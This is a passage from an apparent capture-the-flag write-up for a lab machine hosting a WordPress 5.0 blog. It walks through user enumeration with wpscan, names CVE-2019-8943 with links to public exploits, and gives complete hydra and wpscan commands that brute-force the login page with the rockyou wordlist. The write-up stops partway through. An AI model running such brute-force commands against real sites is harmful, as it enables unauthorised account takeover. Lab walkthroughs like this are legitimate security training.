Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...
In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.
I found a wordpress blog : http://blog.thm/wp-login.php and also the version is 5.0
it's vulnerable to 	`CVE-2019-8943`
found : https://github.com/v0lck3r/CVE-2019-8943 and : https://www.exploit-db.com/exploits/49512
But for this exploit i need to be authenticated
on author i found : http://blog.thm/author/kwheel/ kwheel.
Here i will first try the exploit, or i can try to bruteforce this username password
I will try to use wpscan to find more users
```
└─# wpscan --url http://blog.thm/ --enumerate u
[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

```
found 4 user, now i will try to bruteforce them
```
└─# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt blog.thm -V http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:S=302" 
```
Very slow i used also this:
```
wpscan --url http://blog.thm -P /usr/share/wordlists/rockyou.txt -U username.txt -t 75
```
and Burp Pro